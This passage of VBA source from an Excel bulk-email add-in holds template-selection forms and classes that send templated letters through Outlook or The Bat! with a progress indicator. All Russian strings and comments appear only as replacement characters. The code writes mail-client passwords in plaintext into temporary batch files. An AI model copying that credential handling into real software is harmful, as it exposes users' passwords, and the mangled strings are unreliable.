    folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If folder$ = "" Then Exit Sub
    Me.TextBox_OutputFolder = folder$
End Sub

Private Sub CommandButton_ChangeTemplatesFolder_Click()
    On Error Resume Next
    InitialPath$ = IIf(FWF.FolderExists(TEMPLATES_FOLDER$), TEMPLATES_FOLDER$, ThisWorkbook.Path)
    folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If folder$ = "" Then Exit Sub
    Me.TextBox_TemplatesFolder = folder$
End Sub

Private Sub Label_OpenTemplatesFolder_Click()
    On Error Resume Next: OpenFolder TEMPLATES_FOLDER$
End Sub
Private Sub Label_OpenOutputFolder_Click()
    On Error Resume Next: OpenFolder OUTPUT_FOLDER$
End Sub


Attribute VB_Name = "F_Templates"
Attribute VB_Base = "0{527BEDAC-75AA-416E-9FB0-5239CDC4BFEC}{900505E7-691E-4E14-AE58-D296DF4568A1}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Form      : F_Templates
' Author        : EducatedFool                     Date: 16.01.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text

Private Sub CommandButton_Cancel_Click()
    On Error Resume Next: Err.Clear
    Unload Me
End Sub

Sub CommandButton_InvertSelection_Click()
    On Error Resume Next: Err.Clear
    For i = 0 To Me.ListBox_Templates.ListCount - 1
        Me.ListBox_Templates.Selected(i) = Not Me.ListBox_Templates.Selected(i)
    Next i
    Me.ListBox_Templates.SetFocus
End Sub

Private Sub CommandButton_OpenTemplatesFolder_Click()
    On Error Resume Next
    FolderPath$ = TEMPLATES_FOLDER$
    If CreateObject("Scripting.FileSystemObject").FolderExists(FolderPath$) Then
        CreateObject("wscript.shell").Run "explorer.exe /e,/root, """ & FolderPath$ & """"
    Else
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & IIf(FolderPath$ = "", "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", FolderPath$), _
               vbExclamation, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub

Private Sub CommandButton_Run_Click()
    On Error Resume Next: Err.Clear
    SelectedTemplatesList$ = "|"
    For i = 0 To Me.ListBox_Templates.ListCount - 1
        If Me.ListBox_Templates.Selected(i) = True Then
            SelectedTemplatesList$ = SelectedTemplatesList$ & Me.ListBox_Templates.list(i, 2) & "|"
            SelectedTemplates.Add Me.ListBox_Templates.list(i, 0)
        End If
    Next i
    SETT.SetText "SelectedTemplatesList", SelectedTemplatesList$
    Unload Me
End Sub

Sub CommandButton_SelectAll_Click()
    On Error Resume Next: Err.Clear
    For i = 0 To Me.ListBox_Templates.ListCount - 1
        Me.ListBox_Templates.Selected(i) = True
    Next i
End Sub

Sub CommandButton_UnselectAll_Click()
    On Error Resume Next: Err.Clear
    For i = 0 To Me.ListBox_Templates.ListCount - 1
        Me.ListBox_Templates.Selected(i) = False
    Next i
End Sub

Private Sub ListBox_Templates_Change()
    On Error Resume Next: Err.Clear
    Dim nALL&, nSEL&
    nALL& = Me.ListBox_Templates.ListCount
    For i = 0 To nALL& - 1
        nSEL& = nSEL& - Me.ListBox_Templates.Selected(i)
    Next i

    Me.CommandButton_Run.Enabled = nSEL& > 0
    If Me.Label_Info.Tag <> "" Then Exit Sub
    Me.Label_Info = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nALL& & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nSEL&
    If SETT.GetBoolean("CheckBox_MultiRow") = False Then
        If nSEL& Then Me.Label_Info = Me.Label_Info & ".  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & SelectedRowsCount& * nSEL&
    End If
End Sub

Sub SpinButton_FormWidth_Change()
    SETT.SetText "SpinButton_FormWidth", Me.SpinButton_FormWidth.Value
    SetTemplatesFormWidth
End Sub

Sub SetTemplatesFormWidth()
    On Error Resume Next
    k& = SETT.GetNumber("SpinButton_FormWidth", 0)
    Const FormW& = 560, ListboxW& = 520, StepW& = 20
    Me.Width = FormW& + StepW& * k&
    Me.ListBox_Templates.Width = ListboxW& + StepW& * k&
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next: Err.Clear
    '|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' If SelectedTemplates Is Nothing Then Set SelectedTemplates = FWF.FilenamesCollection(TEMPLATES_FOLDER$)
    Me.SpinButton_FormWidth.Value = SETT.GetNumber("SpinButton_FormWidth", 0)
    SetTemplatesFormWidth

    SelectedTemplatesList$ = SETT.GetText("SelectedTemplatesList", "")

    Tfolder$ = TEMPLATES_FOLDER$
    ReDim arr(1 To SelectedTemplates.Count, 1 To 5)
    For i& = 1 To SelectedTemplates.Count
        arr(i, 1) = SelectedTemplates(i)
        arr(i, 2) = i
        arr(i, 3) = Dir(arr(i, 1))
        arr(i, 4) = TemplateTypeForListbox(arr(i, 1))
        subfolder$ = Replace(arr(i, 1), Tfolder$, "")
        arr(i, 5) = Left(subfolder$, InStrRev(subfolder$, "\") - 1)
    Next

    If SETT.GetBoolean("CheckBox_TemplatesForm_SortByName") Then CoolSort arr, 3

    Me.ListBox_Templates.list = arr
    Set SelectedTemplates = New Collection

    If Len(SelectedTemplatesList$) <= 1 Then
        CommandButton_SelectAll_Click
    Else
        For i = 0 To Me.ListBox_Templates.ListCount - 1
            Me.ListBox_Templates.Selected(i) = SelectedTemplatesList$ Like "*|" & Me.ListBox_Templates.list(i, 2) & "|*"
        Next i
    End If
End Sub

Function CoolSort(SourceArr As Variant, ByVal n As Integer) As Variant
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| N
    If n > UBound(SourceArr, 2) Or n < LBound(SourceArr, 2) Then Exit Function
    Dim Check As Boolean, iCount As Integer, jCount As Integer, nCount As Integer
    ReDim tmpArr(UBound(SourceArr, 2)) As Variant
    Do Until Check
        Check = True
        For iCount = LBound(SourceArr, 1) To UBound(SourceArr, 1) - 1
            If SourceArr(iCount, n) > SourceArr(iCount + 1, n) Then
                For jCount = LBound(SourceArr, 2) To UBound(SourceArr, 2)
                    tmpArr(jCount) = SourceArr(iCount, jCount)
                    SourceArr(iCount, jCount) = SourceArr(iCount + 1, jCount)
                    SourceArr(iCount + 1, jCount) = tmpArr(jCount)
                    Check = False
                Next
            End If
        Next
    Loop
    CoolSort = SourceArr
End Function

Attribute VB_Name = "Letter"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Compare Text

Public Subject As String
Public Body As String
Public Email As String
Public Attachments As New Collection

Public SourceRow As Range

Public UniqueNumber As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

Sub AddSendMark()
    On Error Resume Next
    If SETT.GetBoolean("CheckBox_AddSendMarkIntoRow") Then
        col& = SETT.GetNumber("ComboBox_SendMark_Column")
        If col Then
            If Email Like "*?@?*.?*" Then Me.SourceRow.EntireRow.Columns(col).Value = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        End If
    End If
End Sub

Sub Render(ByRef options As Dictionary)
    On Error Resume Next: Err.Clear
    mask$ = SETT.GetText("TextBox_AttachStaticFilesMask", "")
    If mask$ = "" Then mask$ = "*"

    Static_attach_folder$ = SETT.GetText("TextBox_Mail_AttachStaticFolder", "")

    arr = options.keys
    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = options(arr(i))
        Subject = Replace(Subject, key$, txt$, , , vbTextCompare)
        Body = Replace(Body, key$, txt$, , , vbTextCompare)
        Email = Replace(Email, key$, txt$, , , vbTextCompare)
        mask$ = Replace(mask$, key$, txt$, , , vbTextCompare)
        Static_attach_folder$ = Replace(Static_attach_folder$, key$, txt$, , , vbTextCompare)
    Next i
    Email = Trim(Application.Trim(Application.Clean(Replace(Replace(Email, Chr(160), " "), """", "`"))))
    Subject = Application.Clean(Subject)

    If SETT.GetBoolean("CheckBox_Mail_AttachStaticFiles") Then
        If (Len(Static_attach_folder$) > 2) And CreateObject("Scripting.FileSystemObject").FolderExists(Static_attach_folder$) Then
            Me.AttachAllStaticFiles Static_attach_folder$, mask$
        End If
    End If

End Sub

Sub AddAttachment(ByVal filename$, Optional ByVal FileMask$)
    On Error Resume Next: Err.Clear
    FileMask$ = Trim(FileMask$)
    If Left(FileMask$, 1) <> "*" Then FileMask$ = "*" & FileMask$
    If filename$ Like FileMask$ Then Attachments.Add filename$
End Sub

Sub AttachAllStaticFiles(ByVal Static_attach_folder$, ByVal mask$)
    On Error Resume Next: Err.Clear
    Dim coll As Collection: Set coll = FWF.FilenamesCollection(Static_attach_folder$, mask$, 1)
    For Each item In coll
        AddAttachment item
    Next
End Sub


' ========================= |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| TheBAT ===============================
Function Get_TheBAT_Batch_Command$()
    On Error Resume Next: Err.Clear
    If Not Email Like "*?@?*.?*" Then Exit Function

    strTO$ = "TO=" & Chr(34) & Email & Chr(34) & ";"
    strSUBJECT$ = "SUBJECT=" & Chr(34) & Replace(Subject, """", "`") & Chr(34) & ";"

    user$ = SETT.GetText("ComboBox_TheBAT_Account", "")
    If Len(user$) Then strUSER$ = "USER=" & Chr(34) & user$ & Chr(34) & ";"
    pass$ = SETT.GetText("TextBox_TheBAT_Password", "")
    If Len(pass$) Then strPASS$ = "PASSWORD=" & Chr(34) & pass$ & Chr(34) & ";"

    Randomize: filename$ = Environ("temp") & "\TheBAT." & UniqueNumber & ".txt"        ' & Fix(Rnd() * 1E+15)
    ff = FreeFile: Open filename$ For Output As #ff
    Print #ff, Body: Close #ff
    strTEXT$ = "TEXT=" & Chr(34) & filename$ & Chr(34) & ";"

    For Each File In Attachments
        strATTACH$ = strATTACH$ & "A=" & Chr(34) & File & Chr(34) & ";"
    Next

    Get_TheBAT_Batch_Command$ = "/MAIL;" & strUSER$ & strPASS$ & strTO$ & strSUBJECT$ & strTEXT$ & strATTACH$
End Function

Function Get_TheBAT_Send_Command$()
    On Error Resume Next: Err.Clear

    strTO$ = "TO=" & Chr(34) & Email & Chr(34) & ";"        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    strSUBJECT$ = "SUBJECT=" & Chr(34) & Replace(Subject, """", "`") & Chr(34) & ";"        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    user$ = SETT.GetText("ComboBox_TheBAT_Account", "")
    If Len(user$) Then strUSER$ = "USER=" & Chr(34) & user$ & Chr(34) & ";"
    pass$ = SETT.GetText("TextBox_TheBAT_Password", "")
    If Len(pass$) Then strPASS$ = "PASSWORD=" & Chr(34) & pass$ & Chr(34) & ";"

    Randomize: filename$ = Environ("temp") & "\mail." & Fix(Rnd() * 1E+15)
    ff = FreeFile: Open filename$ For Output As #ff
    Print #ff, Body: Close #ff        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|

    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    strTEXT$ = "TEXT=" & Chr(34) & filename$ & Chr(34) & ";"

    ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    For Each File In Attachments
        strATTACH$ = strATTACH$ & "A=" & Chr(34) & File & Chr(34) & ";"
    Next

    Get_TheBAT_Send_Command$ = Chr(34) & TheBAT_PATH & Chr(34) & " /MAIL;" & strUSER$ & strPASS$ & strTO$ & strSUBJECT$ & _
                               strTEXT$ & strATTACH$ & " /MINIMIZE"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
End Function

Function Send() As Boolean
    On Error Resume Next: Err.Clear
    cmd$ = Get_TheBAT_Send_Command$
    CreateObject("WScript.Shell").Exec cmd$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Send = Err = 0
End Function

Attribute VB_Name = "Letters"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : Letters
' Author        : |fffd||fffd||fffd||fffd||fffd|                     Date: 30.07.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text

Public Items As New Collection

Function CreateNewLetter() As Letter
    On Error Resume Next: Err.Clear
    Set CreateNewLetter = New Letter
    CreateNewLetter.Email = SETT.GetText("TextBox_MailTo")
    CreateNewLetter.Subject = SETT.GetText("TextBox_MailSubject")
    CreateNewLetter.Body = SETT.GetText("TextBox_MailBody")
    Items.Add CreateNewLetter
End Function

Function SendAll(Optional ByRef SendErr$) As Boolean
    On Error Resume Next: Err.Clear
    Select Case SETT.GetNumber("MultiPage_SendMode")
        Case 0        ' TheBAT
            MailClient$ = "TheBAT": SendAll = SendAll_using_TheBAT
        Case 1        ' Outlook
            MailClient$ = "Outlook": SendAll = SendAll_using_Outlook(SendErr$)
    End Select

    Dim L As Letter, attcount&
    For Each L In Items
        attcount& = attcount& + L.Attachments.Count
    Next

    attmode$ = IIf(SETT.GetBoolean("CheckBox_Mail_AttachStaticFiles"), "static", "") & "," & IIf(SETT.GetBoolean("CheckBox_Mail_AttachCreatedFiles"), "created", "") & ""

    'ND "run macro", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & MailClient$ & "): |fffd||fffd||fffd||fffd||fffd|=" & Items.Count & "(" & IIf(ImmediateSend, "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|") & "), |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|=" & _
     attcount& & IIf(Len(attmode$) > 2, ", Attach_mode=" & attmode$, " ")
    AppActivate Application.Name
End Function

Function SendAll_using_Outlook(Optional ByRef SendErr$) As Boolean
    On Error Resume Next: Err.Clear
    Dim ImmediateSend As Boolean: ImmediateSend = SETT.GetBoolean("CheckBox_ImmediateSendMail")

    Dim OA As Object: Set OA = CreateObject("Outlook.Application")
    If OA Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| OUTLOOK |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Function

    SendInterval_Min! = Val(Replace(SETT.GetText("TextBox_SendInterval_Min"), ",", "."))
    SendInterval_Max! = Val(Replace(SETT.GetText("TextBox_SendInterval_Max"), ",", "."))
    SendInterval_Fixed! = Application.Min(SendInterval_Min!, SendInterval_Max!)
    SendInterval_Random! = Abs(SendInterval_Min! - SendInterval_Max!)

    Dim L As Letter, U_txt$, n&, pi As ProgressIndicator, ind&
    n = SETT.GetNumber("Email_Counter", 0)

    If ImmediateSend And (SendInterval_Fixed! + SendInterval_Random! > 0.001) Then
        Set pi = New ProgressIndicator
        pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End If

    For Each L In Items
        If L.Email Like "*?@?*.?*" Then

            n = n + 1: L.UniqueNumber = Format(n, "00000000")

            With OA.CreateItem(0)        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                .To = L.Email: .Subject = L.Subject:

                If L.Body Like "*<html*>*?</html>*" Then
                    .HTMLBody = L.Body
                    .BodyFormat = 2        ' olFormatHTML
                Else
                    .Body = L.Body
                    .BodyFormat = 1        ' olFormatPlain
                End If

                For Each File In L.Attachments: .Attachments.Add File: Next

                If ImmediateSend Then
                    ind& = ind& + 1: Randomize
                    SendInterval! = SendInterval_Fixed! + Rnd(ind&) * SendInterval_Random!
                    If SendInterval! > 0.001 Then
                        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| " & ind& & " |fffd||fffd| " & Me.Items.Count & "  (email: " & L.Email & ")"
                        '                    Set pi = New ProgressIndicator
                        '                    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                        Const stp& = 10: Dim t As Double, pos As Long, prev_dt As Double
                        pi.StartNewAction , , , , , SendInterval! * stp&
                        t = Timer: prev_dt = 0
                        While Timer - t < SendInterval!
                            dt = Timer - t: DoEvents
                            If StopMacro Then
                                pi.Hide
                                SendErr$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                                           vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & ind& - 1 & " |fffd||fffd| " & Me.Items.Count
                                GoTo exitLabel
                            End If
                            If (dt - prev_dt) > 1 / stp& Then
                                prev_dt = dt
                                pi.SubAction msg$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Format(SendInterval!, "0.0") & " |fffd||fffd||fffd|...", _
                                             "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Format(SendInterval! - dt, "0.0") & " |fffd||fffd||fffd|..."
                                DoEvents
                            End If
                        Wend

                    Else
                        For i = 1 To 100000: DoEvents: Next        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End If
                    Err.Clear: .Send
                    If Err = 0 Then L.AddSendMark
                Else
                    .Move OA.GetNamespace("MAPI").GetDefaultFolder(4)        ' olFolderOutbox = 4
                    L.AddSendMark
                End If
            End With
        End If
    Next L

    If ImmediateSend Then
        pi.Hide
        Set pi = Nothing
    End If

exitLabel:
   SETT.SetText "Email_Counter", n

    SendAll_using_Outlook = Err = 0
End Function


Function SendAll_using_TheBAT() As Boolean
    On Error Resume Next: Err.Clear
    batchfile$ = CreateBatchFile_TheBAT
    cmd$ = Chr(34) & TheBAT_PATH & Chr(34) & " /BATCH:" & Chr(34) & batchfile$ & Chr(34)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

    res = CreateObject("WScript.Shell").Run(cmd$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    SendAll_using_TheBAT = res = 0
    If res = 0 Then
        Dim L As Letter
        For Each L In Me.Items
            L.AddSendMark
        Next
    End If
End Function

Private Function CreateBatchFile_TheBAT() As String
    On Error Resume Next: Err.Clear
    Dim ImmediateSend As Boolean: ImmediateSend = SETT.GetBoolean("CheckBox_ImmediateSendMail")
    Dim L As Letter, U_txt$, n&
    n = SETT.GetNumber("Email_Counter", 0)

    THEBAT_user$ = SETT.GetText("TextBox_TheBAT_LOGIN_USER", "")
    THEBAT_pass$ = SETT.GetText("TextBox_TheBAT_LOGIN_PASSWORD", "")
    If Len(THEBAT_pass$) + Len(THEBAT_user$) Then
        txt = txt & "/LOGIN;USER=""" & THEBAT_user$ & """;PASSWORD=""" & THEBAT_pass$ & """" & vbNewLine
    End If

    txt = txt & "/NOLOGO" & vbNewLine
    For Each L In Items
        n = n + 1: L.UniqueNumber = Format(n, "00000000")
        txt = txt & L.Get_TheBAT_Batch_Command & vbNewLine
    Next
    SETT.SetText "Email_Counter", n
   
    txt = txt & "/MINIMIZE" & vbNewLine
    If ImmediateSend Then txt = txt & "/SENDALL" & vbNewLine

    filename$ = Environ("TEMP") & "\Batch_" & n & ".txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write txt: .Close
    End With
    CreateBatchFile_TheBAT = filename$
End Function

Attribute VB_Name = "ProgressIndicator"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Class Module      : ProgressIndicator
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 07.10.2012
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------

Public FP As New F_Progress

Public SubActionIndex As Single, SubActionsCount As Single
Private FPVisible As Boolean, FPStartTime As Date, Position As Integer
Private PrS As Integer, PrE As Integer, Percent As Double, LogString As String

Public Parent As ProgressIndicator
Public ShowPercents As Boolean, ShowTime As Boolean, ShowTimeInLog As Boolean
Public Children As New Collection

Function AddChildIndicator(ByVal Caption As String, Optional ByVal FPPosition As Integer = 1) As ProgressIndicator
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|
    On Error Resume Next
    Set AddChildIndicator = New ProgressIndicator
    Set AddChildIndicator.Parent = Me
    AddChildIndicator.Show Caption, FPPosition
    Children.Add AddChildIndicator
End Function

Private Sub Class_Initialize()
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set FP = New F_Progress: ShowPercents = True: FPVisible = True
    PrS = 0: PrE = 100: Set_ProgressBar 0: FP.PrBar.Caption = ""
    FPStartTime = Now: ShowTime = True: ShowPercents = True
    Set FP.indicator = Me
End Sub

Sub Show(ByVal Caption As String, Optional ByVal FPPosition As Integer = 0, _
         Optional LogSize As Long = 0)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd|
    On Error Resume Next
    SetProgressFormCaption Caption: On Error Resume Next:
    FP.PrBar.Width = ProgressBar_Default_Width
    Position = FPPosition
    FP.Tag = Caption: FP.Show:
    If Position <> 0 Then Move Position
    FP.Repaint: DoEvents
    SetLogSize LogSize
End Sub

Sub Hide(): Unload FP: FPVisible = False: End Sub    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|

Sub Repaint()
    FP.Repaint: DoEvents
    If Application.ScreenUpdating = False Then
        Application.ScreenUpdating = True: Application.ScreenUpdating = False
    End If
End Sub

Sub Move(ByVal Position As Integer)    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If Abs(Position) > 3 Then Exit Sub
    h = FP.Height
    If Not Me.Parent Is Nothing Then h = Me.Parent.FP.Height
    FP.Top = FP.Top + (h + 3) * Position
End Sub

Public Property Get Visible(): Visible = FPVisible: End Property

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Property Let Line1(ByVal NewValue As String): FP.L1.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Line2(ByVal NewValue As String): FP.L2.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Line3(ByVal NewValue As String): FP.L3.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Caption(ByVal NewValue As String): SetProgressFormCaption NewValue: End Property

Private Sub SetProgressFormCaption(Optional ByVal Caption As String = "")
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|
